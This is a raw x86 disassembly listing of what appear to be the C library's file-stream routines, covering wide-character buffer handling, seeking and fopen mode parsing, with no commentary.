mov dword [esp], ebx
call fcn.0804c590
mov edx, 0xffffffff
inc eax
je 0x804a94d
mov eax, dword [ebx + 0x58]
mov eax, dword [eax + 0xb8]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_ch]
mov ebx, dword [arg_8h]
mov ecx, dword [ebx]
test cl, 8
jne 0x804ab3a
test ch, 8
jne 0x804a9d7
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0xc]
test eax, eax
je 0x804aaf8
mov eax, dword [edx + 0x1c]
cmp dword [edx], eax
je 0x804aae2
mov eax, dword [edx + 0x1c]
mov esi, dword [edx]
mov dword [edx + 0x14], eax
mov dword [edx + 0x10], esi
mov dword [edx + 0xc], esi
mov eax, dword [edx + 4]
mov dword [edx], eax
mov dword [edx + 8], eax
mov eax, dword [ebx + 4]
mov dword [ebx + 0x14], eax
mov dword [ebx + 0x10], eax
mov eax, dword [ebx + 0x20]
mov dword [ebx + 0x18], eax
mov eax, dword [ebx + 8]
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], eax
mov eax, ecx
or ah, 8
test eax, 0x202
mov dword [ebx], eax
je 0x804a9d7
mov dword [edx + 0x14], esi
cmp edi, 0xffffffff
je 0x804aa9a
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x1c]
je 0x804aa55
mov eax, dword [edx + 0x10]
mov ecx, dword [ebx]
mov dword [eax], edi
add eax, 4
test cl, 2
mov dword [edx + 0x10], eax
jne 0x804aa11
and ch, 2
je 0x804aa07
cmp edi, 0xa
je 0x804aa11
mov eax, edi
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [ebx + 0x5c]
test ecx, ecx
jle 0x804aa3b
sub eax, dword [edx + 0xc]
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.0804a340
inc eax
jne 0x804aa07
mov eax, 0xffffffff
jmp 0x804aa09
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov dword [esp], ebx
sub eax, edx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0804bd90
jmp 0x804aa31
mov esi, dword [ebx + 0x5c]
test esi, esi
jle 0x804aa80
sub eax, dword [edx + 0xc]
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.0804a340
inc eax
je 0x804aa34
mov edx, dword [ebx + 0x58]
jmp 0x804a9eb
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov dword [esp], ebx
sub eax, edx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0804bd90
jmp 0x804aa75
mov edi, dword [ebx + 0x5c]
test edi, edi
jle 0x804aac5
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 0x10]
sub edx, dword [eax + 0xc]
sar edx, 2
mov dword [var_8h], edx
mov eax, dword [eax + 0xc]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.0804a340
jmp 0x804aa09
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov dword [esp], ebx
sub eax, edx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0804bd90
jmp 0x804aa09
mov eax, dword [ebx + 0x1c]
mov dword [ebx + 4], eax
mov dword [ebx + 8], eax
mov eax, dword [edx + 0x18]
mov dword [edx], eax
mov dword [edx + 4], eax
jmp 0x804a998
mov dword [esp], ebx
call fcn.08076080
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x18]
mov dword [edx + 8], eax
mov dword [edx], eax
mov dword [edx + 4], eax
mov eax, dword [ebx + 0x10]
test eax, eax
je 0x804ab1c
mov ecx, dword [ebx]
jmp 0x804a998
mov dword [esp], ebx
call fcn.0804dbb0
mov eax, dword [ebx + 0x1c]
mov ecx, dword [ebx]
mov edx, dword [ebx + 0x58]
mov dword [ebx + 0xc], eax
mov dword [ebx + 4], eax
mov dword [ebx + 8], eax
jmp 0x804a998
or ecx, 0x20
mov dword [ebx], ecx
call fcn.08048b20
mov dword [eax], 9
jmp 0x804aa34
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov dword [var_10h], 0
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
mov ecx, dword [edx + 0xc]
cmp eax, ecx
jbe 0x804abb0
mov ebx, dword [esi + 0x5c]
test ebx, ebx
jle 0x804ac70
sub eax, ecx
sar eax, 2
mov dword [var_sp_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], esi
mov dword [var_sp_4h], eax
call fcn.0804a340
test eax, eax
je 0x804abad
mov eax, 0xffffffff
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov edx, dword [esi + 0x58]
mov eax, dword [edx]
sub eax, dword [edx + 4]
mov ebx, eax
sar ebx, 2
jne 0x804abcf
mov dword [esi + 0x4c], 0xffffffff
mov dword [esi + 0x50], 0xffffffff
mov eax, dword [var_10h]
jmp 0x804aba2
mov edi, dword [esi + 0x54]
mov dword [esp], edi
call dword [edi + 0x10]
test eax, eax
jle 0x804ac28
imul ebx, eax
mov eax, dword [esi + 0x94]
mov edx, ebx
mov dword [esp], esi
sar edx, 0x1f
mov dword [var_sp_ch], 1
mov dword [var_sp_4h], ebx
mov dword [var_sp_8h], edx
call dword [eax + 0x40]
and eax, edx
inc eax
je 0x804ac15
mov eax, dword [esi + 0x58]
mov edx, dword [eax]
mov dword [eax + 4], edx
mov eax, dword [esi + 4]
mov dword [esi + 8], eax
jmp 0x804abbc
call fcn.08048b20
cmp dword [eax], 0x1d
je 0x804abbc
mov dword [var_10h], 0xffffffff
jmp 0x804abca
mov ecx, dword [esi + 0x58]
mov eax, dword [ecx + 0x34]
mov edx, dword [ecx + 0x38]
mov dword [ecx + 0x2c], eax
mov dword [ecx + 0x30], edx
mov dword [var_sp_10h], ebx
mov eax, dword [esi + 8]
mov dword [var_sp_ch], eax
mov eax, dword [esi + 0xc]
mov dword [var_sp_8h], eax
mov eax, dword [esi + 0x58]
mov dword [esp], edi
add eax, 0x2c
mov dword [var_sp_4h], eax
call dword [edi + 0x18]
mov ecx, dword [esi + 0xc]
lea edx, [eax + ecx]
mov ebx, eax
mov dword [esi + 4], edx
mov edx, dword [esi + 8]
sub edx, ecx
sub ebx, edx
jmp 0x804abdf
mov eax, dword [esi + 0x14]
mov edx, dword [esi + 0x10]
mov dword [esp], esi
sub eax, edx
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], eax
call fcn.0804bd90
jmp 0x804ab99
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10b8
mov dword [var_1088h], 0
mov esi, dword [arg_14h]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov eax, dword [arg_ch]
mov dword [var_1078h], edx
mov edx, dword [edi + 0x58]
mov dword [var_107ch], eax
mov ecx, dword [edx + 4]
cmp dword [edx + 8], ecx
je 0x804b231
mov eax, dword [arg_18h]
test eax, eax
jne 0x804ad06
test byte [edi + 1], 1
je 0x804aced
cmp dword [edx], ecx
jb 0x804b217
mov dword [esp], edi
call fcn.08075a00
mov edx, dword [edi + 0x58]
mov esi, 1
mov dword [var_107ch], 0
mov dword [var_1078h], 0
mov eax, dword [edx + 0xc]
cmp dword [edx + 0x10], eax
ja 0x804ad14
test byte [edi + 1], 8
je 0x804ad2e
mov dword [esp], edi
call fcn.08076150
xor ecx, ecx
test eax, eax
mov edx, 0xffffffff
jne 0x804af20
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x18]
test eax, eax
jne 0x804ad74
mov eax, dword [edx + 8]
test eax, eax
jne 0x804b204
mov dword [esp], edi
call fcn.0804dbb0
mov eax, dword [edi + 0x1c]
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov dword [edi + 0xc], eax
mov dword [edi + 4], eax
mov dword [edi + 8], eax
mov eax, dword [edi + 0x58]
mov edx, dword [eax + 0x18]
mov dword [eax + 0x10], edx
mov dword [eax + 0xc], edx
mov dword [eax + 0x14], edx
mov dword [eax + 8], edx
mov dword [eax], edx
mov dword [eax + 4], edx
cmp esi, 1
je 0x804b157
jle 0x804ad88
cmp esi, 2
je 0x804b110
mov ebx, dword [arg_18h]
mov edx, dword [var_107ch]
mov ecx, dword [var_1078h]
test ebx, ebx
je 0x804af20
mov edx, dword [edi + 0x4c]
mov ecx, dword [edi + 0x50]
mov dword [var_10a0h], edx
mov dword [var_109ch], ecx
mov eax, dword [var_10a0h]
and eax, ecx
inc eax
je 0x804b109
mov ecx, dword [edi + 0xc]
test ecx, ecx
mov dword [var_1090h], ecx
je 0x804b109
mov ebx, dword [edi]
test bh, 1
jne 0x804afa5
mov eax, dword [var_107ch]
mov edx, dword [var_1078h]
sub eax, dword [var_10a0h]
sbb edx, dword [var_109ch]
mov dword [var_1098h], eax
mov eax, dword [edi + 8]
mov dword [var_1094h], edx
sub eax, ecx
cdq
add dword [var_1098h], eax
adc dword [var_1094h], edx
mov ecx, dword [var_1094h]
test ecx, ecx
js 0x804afa5
cmp dword [var_1094h], edx
jg 0x804afa5
jl 0x804ae3a
cmp dword [var_1098h], eax
ja 0x804afa5
mov eax, dword [var_1090h]
mov ecx, dword [edi + 0x58]
add eax, dword [var_1098h]
mov edx, dword [edi + 0x54]
mov dword [var_10a4h], edx
mov dword [edi + 4], eax
mov eax, dword [edi + 0x1c]
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov eax, dword [ecx + 0x34]
mov edx, dword [ecx + 0x38]
mov dword [ecx + 0x2c], eax
mov dword [ecx + 0x30], edx
mov edx, dword [edi + 0x58]
mov ecx, dword [edi + 0xc]
mov eax, dword [edx + 8]
mov dword [var_1074h], ecx
mov dword [edx], eax
mov eax, dword [edi + 4]
lea ebx, [var_1070h]
mov dword [var_ch], eax
mov dword [var_8h], ecx
lea eax, [edx + 0x2c]
mov dword [var_1ch], ebx
lea ebx, [var_6ch]
mov dword [var_4h], eax
mov dword [var_18h], ebx
mov eax, dword [var_10a4h]
lea ebx, [var_106ch]
mov dword [var_14h], ebx
lea ebx, [var_1074h]
mov dword [var_10h], ebx
mov dword [esp], eax
call dword [eax + 0xc]
cmp eax, 1
ja 0x804af2f
mov ecx, dword [var_1074h]
mov eax, dword [edi + 4]
cmp ecx, eax
je 0x804aed8
mov edx, dword [edi + 0x58]
jmp 0x804ae81
mov edx, dword [edi + 0x58]
mov ecx, dword [edi + 0x50]
and dword [edi], 0xffffffef
mov eax, dword [edx + 8]
test ecx, ecx
mov dword [edx], eax
mov edx, dword [edi + 0x4c]
js 0x804af10
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_8h], ecx
mov dword [var_ch], 0
mov dword [var_4h], edx
call dword [eax + 0x40]
lea esi, [esi]
mov edx, dword [var_107ch]
mov ecx, dword [var_1078h]
lea esi, [esi]
add esp, 0x10b8
mov eax, edx
mov edx, ecx
pop ebx
pop esi
pop edi
leave
ret
or dword [edi], 0x20
mov dword [esp], edi
call fcn.0804e6b0
mov eax, dword [edi + 0x94]
mov edx, dword [var_107ch]
mov dword [esp], edi
mov ecx, dword [var_1078h]
mov dword [var_ch], esi
mov dword [var_4h], edx
mov dword [var_8h], ecx
call dword [eax + 0x40]
mov ebx, eax
mov esi, edx
and eax, edx
inc eax
je 0x804af9c
mov eax, dword [edi + 0x1c]
mov dword [edi + 0x50], edx
and dword [edi], 0xffffffef
mov dword [edi + 0x4c], ebx
mov dword [edi + 0xc], eax
mov dword [edi + 4], eax
mov dword [edi + 8], eax
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov eax, dword [edi + 0x58]
mov edx, dword [eax + 0x18]
mov dword [eax + 8], edx
mov dword [eax], edx
mov dword [eax + 4], edx
mov dword [eax + 0x10], edx
mov dword [eax + 0xc], edx
mov dword [eax + 0x14], edx
mov edx, ebx
mov ecx, esi
jmp 0x804af20
and ebx, 4
jne 0x804af32
mov eax, dword [edi + 0x20]
mov ebx, dword [var_107ch]
sub eax, dword [edi + 0x1c]
mov esi, dword [var_1078h]
mov edx, eax
neg edx
mov ecx, edx
and ebx, edx
mov edx, dword [var_107ch]
sar ecx, 0x1f
and esi, ecx
mov ecx, dword [var_1078h]
sub edx, ebx
mov dword [var_1084h], edx
sbb ecx, esi
cdq
cmp ecx, edx
mov dword [var_1080h], ecx
jl 0x804b014
jg 0x804aff4
cmp dword [var_1084h], eax
jbe 0x804b014
mov ebx, dword [var_107ch]
mov esi, dword [var_1078h]
mov dword [var_1084h], 0
mov dword [var_1080h], 0
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [var_ch], 0
call dword [eax + 0x40]
mov ecx, 0xffffffff
mov esi, edx
mov ebx, eax
mov edx, 0xffffffff
test esi, esi
js 0x804af20
xor ecx, ecx
mov eax, dword [var_1080h]
or eax, dword [var_1084h]
je 0x804b0c6
mov eax, dword [var_1088h]
mov ecx, dword [edi + 0x94]
test eax, eax
jne 0x804b0fb
mov edx, dword [edi + 0x20]
mov eax, dword [edi + 0x1c]
sub edx, eax
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], edi
call dword [ecx + 0x38]
cdq
mov ecx, eax
cmp edx, dword [var_1080h]
jg 0x804b0c6
jl 0x804b095
cmp eax, dword [var_1084h]
jae 0x804b0c6
mov ebx, dword [var_1084h]
mov esi, dword [var_1080h]
inc ecx
mov dword [var_107ch], ebx
mov dword [var_1078h], esi
je 0x804b0bc
sub dword [var_107ch], eax
sbb dword [var_1078h], edx
mov esi, 1
jmp 0x804af32
mov edx, dword [edi + 0x1c]
mov eax, dword [var_1084h]
add eax, edx
mov dword [edi + 0xc], edx
mov dword [edi + 0x14], edx
mov dword [edi + 4], eax
mov dword [edi + 0x10], edx
mov dword [edi + 0x18], edx
lea eax, [ecx + edx]
mov dword [edi + 8], eax
mov eax, ecx
cdq
add eax, ebx
adc edx, esi
mov dword [edi + 0x4c], eax
and dword [edi], 0xffffffef
mov dword [edi + 0x50], edx
jmp 0x804af10
mov edx, dword [var_1084h]
mov eax, dword [edi + 0x1c]
jmp 0x804b072
mov ebx, dword [edi]
jmp 0x804afa5
mov eax, dword [edi + 0x94]
lea ebx, [var_6ch]
mov dword [esp], edi
mov dword [var_4h], ebx
call dword [eax + 0x48]
test eax, eax
jne 0x804af32
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
jne 0x804af32
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
add dword [var_107ch], eax
adc dword [var_1078h], edx
xor esi, esi
jmp 0x804ad88
mov edx, dword [edi + 0x54]
mov dword [var_108ch], edx
mov dword [esp], edx
call dword [edx + 0x10]
test eax, eax
mov ecx, eax
jle 0x804b1a6
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 4]
sub eax, dword [edx]
sar eax, 2
imul eax, ecx
cdq
mov ecx, dword [edi + 0x50]
sub dword [var_107ch], eax
sbb dword [var_1078h], edx
mov edx, dword [edi + 0x4c]
mov eax, edx
and eax, ecx
inc eax
je 0x804af32
add dword [var_107ch], edx
adc dword [var_1078h], ecx
jmp 0x804b150
mov ecx, dword [edi + 0x58]
mov ebx, dword [ecx]
mov eax, dword [ecx + 0x34]
sub ebx, dword [ecx + 8]
mov edx, dword [ecx + 0x38]
mov dword [ecx + 0x2c], eax
mov dword [ecx + 0x30], edx
mov ecx, dword [var_108ch]
sar ebx, 2
mov dword [var_10h], ebx
mov eax, dword [edi + 8]
mov dword [var_ch], eax
mov eax, dword [edi + 0xc]
mov dword [var_8h], eax
mov eax, dword [edi + 0x58]
mov dword [esp], ecx
add eax, 0x2c
mov dword [var_4h], eax
call dword [ecx + 0x18]
mov ecx, dword [edi + 0x58]
mov ebx, dword [edi + 0xc]
lea edx, [eax + ebx]
mov dword [edi + 4], edx
mov edx, dword [ecx]
mov dword [ecx + 4], edx
mov edx, dword [edi + 8]
sub edx, ebx
sub edx, eax
mov eax, edx
jmp 0x804b17a
mov dword [esp], eax
call fcn.08051180
and dword [edi], 0xfffffeff
jmp 0x804ad40
call fcn.08048b20
mov ecx, 0xffffffff
mov edx, 0xffffffff
mov dword [eax], 0x16
jmp 0x804af20
mov eax, dword [edx + 0x10]
cmp dword [edx + 0xc], eax
mov eax, 1
cmovne eax, dword [var_1088h]
mov dword [var_1088h], eax
jmp 0x804accd
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov dword [var_14h], 0
mov eax, dword [arg_10h]
mov esi, dword [arg_ch]
mov dword [var_10h], eax
xor eax, eax
test edx, edx
je 0x804b316
mov edx, dword [arg_8h]
mov ecx, dword [arg_8h]
mov edi, dword [edx + 0x58]
mov eax, dword [ecx]
mov ebx, dword [edi + 0x14]
mov edx, dword [edi + 0x10]
and eax, 0xa00
sub ebx, edx
sar ebx, 2
cmp eax, 0xa00
je 0x804b35d
test ebx, ebx
je 0x804b2d0
cmp ebx, dword [arg_10h]
cmova ebx, dword [arg_10h]
cmp ebx, 0x14
ja 0x804b339
mov edx, ebx
mov ecx, dword [edi + 0x10]
dec edx
js 0x804b2c5
mov eax, dword [esi]
add esi, 4
mov dword [ecx], eax
add ecx, 4
dec edx
jns 0x804b2b8
mov dword [edi + 0x10], ecx
mov edx, dword [arg_10h]
sub edx, ebx
mov dword [var_10h], edx
mov eax, dword [var_10h]
test eax, eax
jne 0x804b31e
mov eax, dword [var_14h]
test eax, eax
je 0x804b310
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
mov ecx, dword [edx + 0xc]
cmp eax, ecx
je 0x804b310
sub eax, ecx
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 0xc]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804a340
lea esi, [esi]
mov eax, dword [arg_10h]
sub eax, dword [var_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_10h]
mov eax, dword [arg_8h]
mov dword [var_4h], esi
mov dword [var_8h], ecx
mov dword [esp], eax
call fcn.08075f20
sub dword [var_10h], eax
jmp 0x804b2d7
mov ecx, dword [arg_ch]
mov dword [var_8h], ebx
mov dword [var_4h], ecx
mov eax, dword [edi + 0x10]
mov dword [esp], eax
call fcn.080539d0
mov dword [edi + 0x10], eax
mov eax, dword [arg_ch]
lea esi, [eax + ebx*4]
jmp 0x804b2c8
mov ebx, dword [edi + 0x1c]
sub ebx, edx
sar ebx, 2
cmp ebx, dword [arg_10h]
jb 0x804b29c
mov edx, dword [arg_10h]
lea eax, [esi + edx*4]
cmp eax, esi
jbe 0x804b29c
lea esi, [esi]
sub eax, 4
cmp dword [eax], 0xa
je 0x804b392
cmp eax, dword [arg_ch]
ja 0x804b380
jmp 0x804b29c
sub eax, dword [arg_ch]
mov dword [var_14h], 1
sar eax, 2
lea ebx, [eax + 1]
jmp 0x804b29c
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x38], 0xffffffff
je 0x804b7dd
mov eax, dword [ebx + 0x5c]
test eax, eax
jle 0x804b800
mov eax, dword [ebx + 0x58]
mov edx, dword [eax + 0x10]
sub edx, dword [eax + 0xc]
sar edx, 2
mov dword [var_8h], edx
mov eax, dword [eax + 0xc]
mov dword [esp], ebx
mov dword [esp + 4], eax
call fcn.0804a340
test byte [ebx], 0x40
je 0x804b7f0
mov dword [arg_8h], ebx
mov dword [arg_ch], 0
mov ebx, dword [var_4h]
leave
jmp 0x804e0e0
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x44]
jmp 0x804b7dd
mov esi, esi
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov dword [esp], ebx
sub eax, edx
mov dword [esp + 4], edx
mov dword [var_8h], eax
call fcn.0804bd90
jmp 0x804b7d8
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov eax, dword [arg_8h]
mov edi, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov edx, dword [arg_14h]
mov esi, dword [arg_18h]
test byte [eax + 0x3c], 2
jne 0x804b900
mov eax, ecx
mov dword [var_8h], edx
or ah, 0x80
test edi, edi
cmove ecx, eax
mov eax, dword [arg_ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.08053ec0
mov edi, eax
xor eax, eax
test edi, edi
js 0x804b89f
mov edx, dword [arg_8h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
mov dword [edx + 0x38], edi
mov edx, esi
and edx, 0x100c
and esi, 0x1004
and eax, 0xffffeff3
or eax, edx
cmp esi, 0x1004
mov dword [ebx], eax
je 0x804b8a7
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804d600
mov eax, dword [arg_8h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_8h], 0
mov dword [var_10h], 3
mov dword [var_ch], 2
mov dword [var_4h], 0
call dword [eax + 0x24]
and eax, edx
inc eax
jne 0x804b891
call fcn.08048b20
cmp dword [eax], 0x1d
mov ecx, eax
je 0x804b891
mov ebx, edi
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov edx, eax
ja 0x804b8fa
xor eax, eax
jmp 0x804b89f
neg edx
mov dword [ecx], edx
jmp 0x804b8f6
mov eax, ecx
mov ebx, dword [arg_ch]
or ah, 0x80
test edi, edi
cmove ecx, eax
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov edi, eax
jbe 0x804b861
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x804b861
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x34
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
cmp dword [eax + 0x38], 0xffffffff
jne 0x804b979
movsx eax, byte [edx]
cmp eax, 0x72
je 0x804bc44
jg 0x804bc25
cmp eax, 0x61
je 0x804b983
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edi, 1
mov esi, 0x440
mov dword [var_20h_2], 0x1004
mov ebx, edx
mov ecx, 1
nop
lea esi, [esi]
inc edx
movsx eax, byte [edx]
cmp eax, 0x63
je 0x804bc19
jg 0x804bbf7
cmp eax, 0x62
je 0x804bbf0
test eax, eax
je 0x804b9d6
cmp eax, 0x2b
je 0x804bbe0
lea esi, [esi]
inc ecx
cmp ecx, 5
jle 0x804b9a0
mov eax, dword [arg_14h]
or edi, esi
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [var_8h], edi
mov dword [var_sp_ch], 0x1b6
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.0804b820
test eax, eax
mov dword [var_24h], eax
je 0x804bb75
lea eax, [ebx + 1]
mov dword [var_4h], 0x8092ab4
mov dword [esp], eax
call fcn.080535c0
test eax, eax
mov esi, eax
je 0x804bb75
lea edi, [eax + 5]
mov dword [var_28h], esp
mov dword [var_4h], 0x2c
mov dword [esp], edi
call fcn.08053870
sub eax, esi
lea edx, [eax + 0x10]
sub eax, 5
and edx, 0xfffffffc
sub esp, edx
lea ebx, [var_27h]
mov dword [var_8h], eax
mov dword [var_4h], edi
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.08053740
mov byte [eax], 0
mov dword [esp], ebx
mov dword [var_4h], ebx
call fcn.0804b540
cmp byte [ebx + 2], 0
jne 0x804ba95
mov esi, ebx
lea esi, [esi]
movsx edx, byte [edi]
mov eax, dword [0x80a99fc]
mov ecx, esi
inc edi
inc esi
mov eax, dword [eax + edx*4]
test al, al
mov byte [ecx], al
jne 0x804ba80
lea eax, [var_1ch]
mov edx, ebx
call fcn.08053cb0
test eax, eax
jne 0x804bbc2
cmp dword [var_18h], 1
jne 0x804bba1
cmp dword [var_bp_10h], 1
jne 0x804bb7d
mov edx, dword [var_8h]
mov esi, 0x80a9b40
mov ecx, 0x1e
cld
mov eax, dword [edx + 0x58]
mov edx, dword [eax + 4]
mov dword [eax + 0x2c], 0
mov dword [eax + 0x30], 0
mov edi, dword [var_8h]
mov dword [eax], edx
mov edx, dword [eax + 0xc]
mov dword [eax + 0x10], edx
mov eax, dword [edi + 0x58]
mov dword [eax + 0x34], 0
mov dword [eax + 0x38], 0
mov ebx, dword [edi + 0x58]
add ebx, 0x3c
mov dword [edi + 0x54], ebx
mov edi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_18h]
mov dword [ebx + 0x20], eax
mov eax, dword [var_1ch]
mov dword [ebx + 0x30], 1
mov dword [ebx + 0x34], 0
mov dword [ebx + 0x38], 1
mov dword [ebx + 0x24], eax
mov edx, dword [var_24h_2]
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x48], 0
add eax, 0x2c
mov dword [ebx + 0x3c], eax
mov eax, dword [var_bp_10h]
mov dword [ebx + 0x4c], eax
mov eax, dword [var_bp_14h]
mov dword [ebx + 0x64], 1
mov dword [ebx + 0x60], 0
mov dword [ebx + 0x50], eax
mov dword [ebx + 0x5c], 1
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x74], 0x80a9bb8
add eax, 0x2c
mov dword [ebx + 0x68], eax
mov dword [edx + 0x5c], 1
mov esp, dword [var_28h_2]
mov eax, dword [var_24h]
jmp 0x804b97b
mov dword [var_sp_ch], str._IO_new_file_fopen
mov dword [var_8h], 0x16d
mov dword [var_4h], 0x8092961
mov dword [esp], str.fcts.tomb_nsteps__1
call fcn.0805efc0
mov dword [var_sp_ch], str._IO_new_file_fopen
mov dword [var_8h], 0x16c
mov dword [var_4h], 0x8092961
mov dword [esp], str.fcts.towc_nsteps__1
jmp 0x804bb9c
mov edi, dword [var_8h]
mov dword [esp], edi
call fcn.0804b620
call fcn.08048b20
mov dword [eax], 0x16
mov esp, dword [var_28h_2]
jmp 0x804b979
and dword [var_20h_2], 0x1000
mov edi, 2
lea esi, [esi]
mov ebx, edx
jmp 0x804b9d0
cmp eax, 0x6d
je 0x804bc0d
cmp eax, 0x78
jne 0x804b9d0
or esi, 0x80
jmp 0x804bbf0
mov eax, dword [var_8h]
or dword [eax + 0x3c], 1
jmp 0x804b9d0
mov edx, dword [arg_8h]
or dword [edx + 0x3c], 2
jmp 0x804b9d6
cmp eax, 0x77
jne 0x804b96e
mov edi, 1
mov esi, 0x240
mov dword [var_20h_2], 4
jmp 0x804b994
xor edi, edi
mov dword [var_20h], 8
jmp 0x804b994
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp dword [ebx + 0x38], 0xffffffff
jne 0x804bcd2
mov eax, dword [arg_ch]
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov dword [ebx + 0x38], eax
mov eax, dword [ebx]
and eax, 0xfffffff3
or eax, 0x40
mov dword [ebx], eax
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_10h], 3
mov dword [var_ch], 1
mov dword [var_sp_4h], 0
mov dword [var_8h], 0
call dword [eax + 0x24]
and eax, edx
inc eax
jne 0x804bccb
call fcn.08048b20
cmp dword [eax], 0x1d
jne 0x804bcd2
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
xor eax, eax
jmp 0x804bccd
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.0804ddc0
xor edx, edx
test eax, eax
je 0x804bd1f
mov eax, dword [ebx + 0x1c]
mov edx, ebx
mov dword [ebx + 0x18], eax
mov dword [ebx + 0x14], eax
mov dword [ebx + 0x10], eax
mov dword [ebx + 0xc], eax
mov dword [ebx + 4], eax
mov dword [ebx + 8], eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x58]
mov dword [ebx + 0x94], 0x8092b00
mov dword [eax + 0xb8], 0x80929a0
mov dword [esp], ebx
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.0804bce0
test eax, eax
mov edx, eax
je 0x804bd76
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov eax, dword [ebx + 0x58]
mov dword [ebx + 0x94], 0x8092b60
mov dword [eax + 0xb8], 0x8092a00
jmp 0x804bd6f
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_10h]
test ebx, ebx
jne 0x804bda9
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov eax, dword [arg_ch]
mov dword [var_8h], ebx
mov dword [var_sp_4h], eax
